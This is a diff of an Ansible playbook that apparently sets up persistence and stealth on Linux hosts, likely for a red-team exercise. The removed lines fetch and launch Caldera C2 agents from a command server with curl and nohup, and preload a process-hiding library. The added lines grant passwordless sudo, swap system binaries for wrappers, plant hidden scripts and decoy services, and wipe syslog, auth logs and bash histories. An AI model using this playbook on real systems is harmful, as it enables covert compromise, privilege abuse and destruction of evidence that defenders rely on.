@@ -1,204 +1,180 @@
 ---
-- name: Deploy Caldera agents and process hider on Linux hosts
+- name: Deploy stealth wrappers, decoys, and clean up on Linux hosts
   hosts: linux
   become: yes
-  gather_facts: no
+  gather_facts: yes
 
   vars:
-    deploy_dir: "/etc/ppp/.syslogs-backup-two"
-    wrapper_dir: "/tmp/.tools-t
-    hidden_dir: /media/disk1/.nvme1
-    hidden_dir_nd: /dev/.udev-t
-    purge_logs: false
-    agents: true
-    wrapper: true
+    deploy_dir: /tmp/tools
+    hidden_dir: /opt/.ssh/.sshd
+    hidden_dir_nd: /dev/.udev
+    purge_logs: true
 
   tasks:
-    block: 
-      - name: Create base hidden deployment directory
-        file:
-          path: "{{ deploy_dir }}"
-          state: directory
-          mode: "0755"
-    
-      # Deploy agents
-      # HTTP AGENTS (Sandcat)
-      - name: Deploy HTTP agents
-        shell: |
-          server="http://100.0.0.3:8888"
-          cd {{ deploy_dir }}
-          for name in splunkd splunk laksngbiu0q8hung mesh; do
-            curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
-            chmod +x "$name"
-            nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
-          done
 
-      - name: Deploy HTML agents
-        shell: |
-          server="http://100.0.0.3:8888"
-          cd {{ deploy_dir }}
-          pip install -q requests beautifulsoup4
-          for name in notlog-html; do
-            curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > "$name.py"
-            nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
-          done
+    - name: Create remote deployment directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: directory
+        mode: "0755"
 
-      # TCP AGENTS (Manx)
-      - name: Deploy TCP agents
-        shell: |
-          server="http://100.0.0.3:8888"
-          socket="100.0.0.3:7010"
-          contact="tcp"
-          cd {{ deploy_dir }}
-          for name in notlog-tcp laknvubeiu29083ug pear; do
-            curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
-            chmod +x "$name"
-            nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
-          done
+    - name: Create first hidden directory
+      file:
+        path: "{{ hidden_dir }}"
+        state: directory
+        mode: "0755"
 
-      - name: Copy libprocesshider.so from hideprocesses folder
-        copy:
-          src: ../hideprocesses/libprocesshider.so
-          dest: "/usr/local/lib/libprocesshider.so"
-          mode: "0644"
-      
-      - name: echo to preload
-        shell: echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload > /dev/null
-    when: agents
+    - name: Create second hidden directory
+      file:
+        path: "{{ hidden_dir_nd }}"
+        state: directory
+        mode: "0755"
 
-    block:
-      - name: Create hidden directory
-        file:
-          path: "{{ hidden_dir }}"
-          state: directory
-          mode: "0755"
-        
-      - name: Create second hidden directory
-        file:
-          path: "{{ hidden_dir_nd }}"
-          state: directory
-          mode: "0755"
+    - name: Install 'which' on Rocky 9
+      dnf:
+        name: which
+        state: present
+      when: inventory_hostname in ['triceratops1', 'triceratops2']
 
-      # Copy required scripts from the Linux folder
-      - name: Copy move_binaries.sh
-        copy:
-          src: ../Linux/move_binaries.sh
-          dest: "{{ deploy_dir }}/move_binaries.sh"
-          mode: "0755"
-      
-      - name: Copy move_cd_rocky.sh to Rocky9
-        copy:
-          src: ../Linux/move_cd_rocky.sh
-          dest: "{{ deploy_dir }}/move_cd_rocky.sh"
-          mode: "0755"
-        when: inventory_hostname in ['triceratops1', 'triceratops2']
+    - name: Allow all members of 'sudo' group passwordless sudo
+      lineinfile:
+        path: /etc/sudoers.d/passwordless_sudo
+        line: "%sudo ALL=(ALL) NOPASSWD: ALL"
+        create: yes
+        owner: root
+        group: root
+        mode: '0440'
+        validate: 'visudo -cf %s'
 
-      - name: Copy wrapper_deploy.sh
-        copy:
-          src: ../Linux/wrapper_deploy.sh
-          dest: "{{ deploy_dir }}/wrapper_deploy.sh"
-          mode: "0755"
+    - name: Allow all members of 'wheel' group passwordless sudo (Rocky/RedHat)
+      lineinfile:
+        path: /etc/sudoers.d/wheel_nopasswd
+        line: "%wheel ALL=(ALL) NOPASSWD: ALL"
+        create: yes
+        owner: root
+        group: root
+        mode: '0440'
+        validate: 'visudo -cf %s'
+      when: inventory_hostname in ['triceratops1', 'triceratops2']
 
-      - name: Copy decoy_deploy.sh
-        copy:
-          src: ../Linux/decoy_deploy.sh
-          dest: "{{ deploy_dir }}/decoy_deploy.sh"
-          mode: "0755"
+    - name: Copy move_binaries.sh
+      copy:
+        src: ../Linux/move_binaries.sh
+        dest: "{{ deploy_dir }}/move_binaries.sh"
+        mode: "0755"
 
-      - name: Copy wrap_cat.sh
-        copy:
-          src: ../Linux/wrapper/wrap_cat.sh
-          dest: "{{ deploy_dir }}/wrap_cat.sh"
-          mode: "0755"
+    - name: Copy move_cd_rocky.sh to Rocky 9
+      copy:
+        src: ../Linux/move_cd_rocky.sh
+        dest: "{{ deploy_dir }}/move_cd_rocky.sh"
+        mode: "0755"
+      when: inventory_hostname in ['triceratops1', 'triceratops2']
 
-      - name: Copy wrap_cd.sh
-        copy:
-          src: ../Linux/wrapper/wrap_cd.sh
-          dest: "{{ deploy_dir }}/wrap_cd.sh"
-          mode: "0755"
-      
-      - name: Copy wrap_cd_rocky.sh
-        copy:
-          src: ../Linux/wrapper/wrap_cd_rocky.sh
-          dest: "{{ deploy_dir }}/wrap_cd_rocky.sh"
-          mode: "0755"
-        when: inventory_hostname in ['triceratops1', 'triceratops2']
+    - name: Copy wrapper_deploy.sh
+      copy:
+        src: ../Linux/wrapper_deploy.sh
+        dest: "{{ deploy_dir }}/wrapper_deploy.sh"
+        mode: "0755"
 
+    - name: Copy decoy_deploy.sh
+      copy:
+        src: ../Linux/decoy_deploy.sh
+        dest: "{{ deploy_dir }}/decoy_deploy.sh"
+        mode: "0755"
 
-      - name: Copy wrap_ls.sh
-        copy:
-          src: ../Linux/wrapper/wrap_ls.sh
-          dest: "{{ deploy_dir }}/wrap_ls.sh"
-          mode: "0755"
+    - name: Copy wrap_cat.sh
+      copy:
+        src: ../Linux/wrapper/wrap_cat.sh
+        dest: "{{ deploy_dir }}/wrap_cat.sh"
+        mode: "0755"
 
-      - name: Copy jvage.sh
-        copy:
-          src: ../Linux/on_their_system/jvage.sh
-          dest: "{{ hidden_dir_nd }}/jvage.sh"
-          mode: "0755"
-      
-      - name: Copy jvage_.sh
-        copy:
-          src: ../Linux/on_their_system/jvage_.sh
-          dest: "{{ hidden_dir }}/jvage_.sh"
-          mode: "0755"
+    - name: Copy wrap_cd.sh
+      copy:
+        src: ../Linux/wrapper/wrap_cd.sh
+        dest: "{{ deploy_dir }}/wrap_cd.sh"
+        mode: "0755"
 
-      # Run the deployment scripts in order
-      - name: Run move_binaries.sh to back up system binaries
-        command: "{{ deploy_dir }}/move_binaries.sh"
-        args:
-          chdir: "{{ deploy_dir }}"
-    
-      - name: Run move_binaries.sh to back up system binaries
-        command: "{{ deploy_dir }}/move_cd_rocky.sh"
-        args:
-          chdir: "{{ deploy_dir }}"
-        when: inventory_hostname in ['triceratops1', 'triceratops2']
+    - name: Copy wrap_cd_rocky.sh
+      copy:
+        src: ../Linux/wrapper/wrap_cd_rocky.sh
+        dest: "{{ deploy_dir }}/wrap_cd_rocky.sh"
+        mode: "0755"
+      when: inventory_hostname in ['triceratops1', 'triceratops2']
 
-      - name: Run wrapper_deploy.sh to install the wrappers (ls, cat, cd)
-        command: "{{ deploy_dir }}/wrapper_deploy.sh"
-        args:
-          chdir: "{{ deploy_dir }}"
-      
-      - name: Run warp_cd_rocky.sh to install cd wrapper on rocky
-        command: "{{ deploy_dir }}/wrap_cd_rocky.sh"
-        args:
-          chdir: "{{ deploy_dir }}"
-        when: inventory_hostname in ['triceratops1', 'triceratops2']
+    - name: Copy jvage.sh
+      copy:
+        src: ../Linux/on_their_system/jvage.sh
+        dest: "{{ hidden_dir_nd }}/jvage.sh"
+        mode: "0755"
 
-      # Clean up deployment artifacts and clear logs/history
-      - name: Remove deployment directory
-        file:
-          path: "{{ deploy_dir }}"
-          state: absent
+    - name: Copy jvage_.sh
+      copy:
+        src: ../Linux/on_their_system/jvage_.sh
+        dest: "{{ hidden_dir }}/jvage_.sh"
+        mode: "0755"
 
-          # Log and history cleanup
-      - block:
-          - name: Truncate syslog (Debian/Ubuntu)
-            shell: truncate -s 0 /var/log/syslog 2>/dev/null || true
-            when: ansible_facts['os_family'] == "Debian"
+    - name: Copy ssh_root_enable.sh
+      copy:
+        src: ../Linux/decoy/ssh_root_enable.sh
+        dest: "{{ deploy_dir }}/ssh_root_enable.sh"
+        mode: "0755"
 
-          - name: Truncate auth.log (Debian/Ubuntu)
-            shell: truncate -s 0 /var/log/auth.log 2>/dev/null || true
-            when: ansible_facts['os_family'] == "Debian"
+    - name: Run move_binaries.sh to back up system binaries
+      command: "{{ deploy_dir }}/move_binaries.sh"
+      args:
+        chdir: "{{ deploy_dir }}"
 
-          - name: Truncate messages (Rocky/RedHat)
-            shell: truncate -s 0 /var/log/messages 2>/dev/null || true
-            when: ansible_facts['os_family'] == "RedHat"
+    - name: Run move_cd_rocky.sh to back up cd binary on Rocky
+      command: "{{ deploy_dir }}/move_cd_rocky.sh"
+      args:
+        chdir: "{{ deploy_dir }}"
+      when: inventory_hostname in ['triceratops1', 'triceratops2']
 
-          - name: Truncate secure (Rocky/RedHat)
-            shell: truncate -s 0 /var/log/secure 2>/dev/null || true
-            when: ansible_facts['os_family'] == "RedHat"
+    - name: Run wrapper_deploy.sh to install the wrappers
+      command: "{{ deploy_dir }}/wrapper_deploy.sh"
+      args:
+        chdir: "{{ deploy_dir }}"
 
-          - name: Clear root bash history
-            shell: |
-              [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history 2>/dev/null || true
-              history -c 2>/dev/null || true
-              history -w 2>/dev/null || true
+    - name: Run wrap_cd_rocky.sh to install cd wrapper on Rocky
+      command: "{{ deploy_dir }}/wrap_cd_rocky.sh"
+      args:
+        chdir: "{{ deploy_dir }}"
+      when: inventory_hostname in ['triceratops1', 'triceratops2']
 
-          - name: Clear primary user's bash history (john_hammond)
-            shell: |
-              [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history 2>/dev/null || true
-        when: purge_logs
-        # Create the deployment directory
-    when: wrapper
+    - name: Run decoy_deploy.sh to create decoy systemd services
+      command: "{{ deploy_dir }}/decoy_deploy.sh"
+      args:
+        chdir: "{{ deploy_dir }}"
+
+    - name: Remove deployment directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: absent
+
+    - block:
+        - name: Truncate syslog (Debian/Ubuntu)
+          shell: "test -f /var/log/syslog && truncate -s 0 /var/log/syslog"
+          when: ansible_os_family == "Debian"
+
+        - name: Truncate auth.log (Debian/Ubuntu)
+          shell: "test -f /var/log/auth.log && truncate -s 0 /var/log/auth.log"
+          when: ansible_os_family == "Debian"
+
+        - name: Truncate messages (Rocky/RedHat)
+          shell: "test -f /var/log/messages && truncate -s 0 /var/log/messages"
+          when: ansible_os_family == "RedHat"
+
+        - name: Truncate secure (Rocky/RedHat)
+          shell: "test -f /var/log/secure && truncate -s 0 /var/log/secure"
+          when: ansible_os_family == "RedHat"
+
+        - name: Clear root bash history
+          shell: |
+            [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history || true
+            history -c || true
+            history -w || true
+
+        - name: Clear primary user's bash history (john_hammond)
+          shell: |
+            [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history || true
+      when: purge_logs
